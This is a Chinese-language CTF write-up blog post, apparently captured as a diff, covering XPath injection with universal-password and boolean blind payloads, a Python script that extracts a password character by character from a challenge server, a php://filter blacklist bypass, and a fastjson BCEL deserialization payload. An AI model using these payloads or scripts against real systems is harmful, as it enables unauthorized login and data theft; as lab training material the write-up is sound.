+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">id</span>&gt;</span>2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">age</span>&gt;</span>3<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">id</span>&gt;</span>3<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">age</span>&gt;</span>5<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">secret</span>&gt;</span>flag&#123;xxx&#125;<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>查询语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure>
+
+<p><strong>常规注入</strong></p>
+<p>万能密码1（已知一个节点）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39; or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>万能密码2（无需知道节点）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39; or 1 or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>节点遍历</p>
+<blockquote>
+<p><code>|</code>表示计算两个节点集，<code>//*</code>表示选取文档中所有元素</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39;] | &#x2F;&#x2F;* | &#x2F;&#x2F;*[&#39;&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure>
+
+<p><strong>布尔盲注</strong></p>
+<p>之前的节点遍历虽然选取到了所有数据，但是通常不会打印出来，打印一部分或者只是用来做个判断。</p>
+<p>判断根节点数量</p>
+<blockquote>
+<p><code>/</code>表示从根节点选取</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39;or count(&#x2F;)&#x3D;1 or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>正常回显说明只有一个根节点</p>
+<p>获取根节点长度</p>
+<blockquote>
+<p><code>/*[1]</code>表示先选取所有根节点，再取第一个元素</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39; or string-length(name(&#x2F;*[1]))&#x3D;1 or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>正常回显说明根节点长度为1</p>
+<p>获取根节点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39; or substring(name(&#x2F;*[1]), 1, 1)&#x3D;&#39;a&#39; or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>正常回显说明根节点第一位为<code>a</code></p>
+<p>获取文本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39; or substring(&#x2F;a&#x2F;b&#x2F;id&#x2F;text(), 1, 1)&#x3D;&#39;a&#39; or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;]</span><br></pre></td></tr></table></figure>
+
+<p><strong>解题思路</strong></p>
+<p>先万能密码测试，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2&#39; or &#39;1</span><br><span class="line">&#x3D;&gt;用户名或密码错误</span><br><span class="line">2&#39; or 1 or &#39;1</span><br><span class="line">&#x3D;&gt;非法操作</span><br></pre></td></tr></table></figure>
+
+<p>说明<code>非法操作</code>是条件为真的情况下，写个脚本</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span><span class="params">(username)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line">    url = <span class="string">'http://ha1cyon-ctf.fun:30100/'</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    r = s.get(url).content</span><br><span class="line">    <span class="comment"># print r.decode('utf-8')</span></span><br><span class="line">    re = re.search(<span class="string">r'value="(.*?)" /&gt;'</span>, r.decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    token = re.group(<span class="number">0</span>)[<span class="number">7</span>:<span class="number">-4</span>]</span><br><span class="line">    <span class="comment"># print token</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    password = <span class="string">''</span></span><br><span class="line">    data = <span class="string">'&lt;username&gt;'</span>+username+<span class="string">'&lt;/username&gt;'</span> \</span><br><span class="line">            <span class="string">'&lt;password&gt;'</span>+password+<span class="string">'&lt;/password&gt;'</span> \</span><br><span class="line">            <span class="string">'&lt;token&gt;'</span>+token+<span class="string">'&lt;/token&gt;'</span></span><br><span class="line">    r = s.post(url, headers=headers, data=data).content</span><br><span class="line">    <span class="comment"># print r.content.decode('utf-8')</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'非法操作'</span> <span class="keyword">in</span> r.decode(<span class="string">'utf-8'</span>):</span><br><span class="line">        print(<span class="string">"ok"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    req(<span class="string">"2' or '1"</span>)</span><br><span class="line">    req(<span class="string">"2' or 1 or '1"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlen</span><span class="params">()</span>:</span></span><br><span class="line">    len = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">        <span class="comment"># username = "' or string-length(name(/*[1]))=&#123;&#125; or '1".format(i)</span></span><br><span class="line">        <span class="comment"># username = "' or string-length(name(/root/*[1]))=&#123;&#125; or '1".format(i)</span></span><br><span class="line">        <span class="comment"># username = "' or string-length(name(/root/accounts/user/*[3]))=&#123;&#125; or '1".format(i)</span></span><br><span class="line">        username = <span class="string">"' or string-length(/root/accounts/user[2]/password/text())=&#123;&#125; or '1"</span>.format(i)</span><br><span class="line">        print(username)</span><br><span class="line">        res = req(username)</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">len = getlen()</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">40</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="comment"># username = "'or substring(name(/*[1]), &#123;&#125;, 1)='&#123;&#125;' or'1".format(i + 1, chr(j))</span></span><br><span class="line">        <span class="comment"># username = "'or substring(name(/root*[1]), &#123;&#125;, 1)='&#123;&#125;' or'1".format(i + 1, chr(j))</span></span><br><span class="line">        <span class="comment"># username = "'or substring(name(/root/accounts/user/*[3]), &#123;&#125;, 1)='&#123;&#125;' or'1".format(i + 1, chr(j))</span></span><br><span class="line">        <span class="comment"># id,username,password</span></span><br><span class="line">        username = <span class="string">"'or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;' or'1"</span>.format(i + <span class="number">1</span>, chr(j))</span><br><span class="line">        <span class="comment"># guest,adm1n</span></span><br><span class="line">        <span class="comment"># cf7414b5bdb2e65ee43083f4ddbc4d9f=&gt;gtfly123</span></span><br><span class="line">        print(username)</span><br><span class="line">        res = req(username)</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">1</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>登录后台，发现文件包含，提示<code>/flag</code></p>
+<p>发现黑名单，使用大小写成功绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Php:&#x2F;&#x2F;filter&#x2F;Read&#x3D;convert.Base64-encode&#x2F;resource&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/04/21/T1yfxrSaEVK67bY.png" alt="Snipaste_2020-04-21_15-19-07.png"></p>
+<hr>
+<h3><span id="ezinclude">ezinclude</span></h3><p>提示<code>md5($secret.$name)===$pass</code></p>
+<p>扫目录，<code>dir.php</code>显示了某个目录下的文件，和<code>config.php</code></p>
+<hr>
+<h3><span id="验证">验证🐎</span></h3><p>nodejs</p>
+<h3><span id="ezshiro">ezShiro</span></h3><p>hint：<code>gadget在POM.xml内，jdk&gt;8u191，json反序列化</code></p>
+<p>gadget应该是<code>commons-collections3.2.1</code>，根据<code>jdk&gt;8u191</code>限制，应该是可以使用CC5</p>
+<p>json反序列化应该是fastjson或者jsckson的反序列化漏洞，</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"@type"</span> : <span class="string">"org.apache.tomcat.dbcp.dbcp.BasicDataSource"</span>,</span><br><span class="line">  <span class="attr">"driverClassLoader"</span> :</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"driverClassName"</span> : <span class="string">"$$BCEL$$+CC5"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将CC5的恶意对象进行 <code>BCEL</code>编码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Path path = Paths.get(<span class="string">"poc.txt"</span>);</span><br><span class="line"><span class="keyword">byte</span>[] data = Files.readAllBytes(path);</span><br><span class="line"><span class="comment">//BCEL编码</span></span><br><span class="line">String s =  Utility.encode(data,<span class="keyword">true</span>);</span><br><span class="line">System.out.print(s);</span><br></pre></td></tr></table></figure>
+
+<p>打了一发没成功</p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/wp/" rel="tag"><i class="fa fa-tag"></i> wp</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2020/04/20/vulhub-wp/">
+        <span class="next-text nav-default">vulhub-wp</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+    <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+  </body>
+</html>
